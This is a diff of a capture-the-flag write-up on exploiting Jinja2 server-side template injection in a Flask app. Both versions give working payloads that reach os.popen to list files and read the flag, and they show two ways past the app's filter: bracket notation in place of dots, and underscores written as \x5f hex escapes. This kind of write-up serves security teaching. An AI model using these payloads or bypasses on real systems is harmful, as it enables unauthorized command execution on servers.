@@ -42,15 +42,15 @@ The website returns `49`! That means it is vulnerable to SSTI.
 
 ![image](https://github.com/user-attachments/assets/26b6ae54-1bfe-4884-9df2-66fe944dbcea)
 
-Let's use a SSTI payload like `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` and get our flag!
+Let's use a SSTI payload like `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` to list down files in the directory!
 
 ![image](https://github.com/user-attachments/assets/579ab938-dac5-4d4a-8aed-3edd8ad37819)
 
-Wait but the website prevented us from using the payload.
+The website somehow is blocking our payload.Looks like they blacklisted some characters.
 
 ![image](https://github.com/user-attachments/assets/01fb2f5e-312b-48a1-b6b6-ffc1ceec65d7)
 
-That's weird, it supposed to work. Let's inspect and analyze the provided source code.
+Let's analyze the source code and figure out what character did the website blacklisted.
 
 ### Source Code (python)
 ```python
@@ -88,24 +88,22 @@ if __name__=='__main__':
 
 ```
 
-The website is confirmed to be vulnerable to SSTI (Jinja 2) as the source code contains the function `render_template_string`. However, there is a function that seems to be preventing us from reaching the vulnerable function which is the `sanitize()`. It will return boolean `False` when it detected the strings contains "." which can prevent a regular SSTI payload. We can use another SSTI payload to bypass this sanitization by replacing "." with square brackets.
+The website is confirmed to be vulnerable to SSTI (Jinja 2) as the source code contains the function `render_template_string`. However, there is a function that seems to be preventing us from reaching the vulnerable function which is the `sanitize()`. It will return boolean `False` when it detected the strings contains underscores which can prevent a regular SSTI payload. We can use another SSTI payload to bypass this sanitization by encoding "_" into hex strings which is `\x5f`. Therefore, the payload should look something like this.
 
-`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
+`{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}`
 
-![image](https://github.com/user-attachments/assets/531cce88-b3fe-46fb-8f07-1e2c3d123338)
+Let's use this payload to list down the directories and see what happens.
 
-Let's submit this payload and see what happens.
+![image](https://github.com/user-attachments/assets/e3482f8e-2d40-45b3-b004-398812761e3c)
 
-![image](https://github.com/user-attachments/assets/d3cbfda0-eee2-4e8c-bc99-04ec01dc5b8c)
+And it works! We successfully view all the files contain inside the server directory. Let's try viewing the flag using this command:
 
-And it works! We can view all the files contain inside the server directory. Let's try to view the flag using command:
+`{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat flag-d3a358c6bff2c9f7412e5485b3e2cd2e.txt ')['read']()}}`
 
-`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag-923a4ee403778170c879557425f22848.txt')['read']()}}`
-
-![image](https://github.com/user-attachments/assets/c43644b2-a538-469d-89e3-7b2290c0d623)
+![image](https://github.com/user-attachments/assets/28949435-0e8d-4d1c-b292-492768262978)
 
 
 ## Flag
->flag{c2ea5e9e00acde74027b2ad8cf5583bd}
+>flag{3a823364c48716d80fb5a766454bacd4} 
 
 </details>
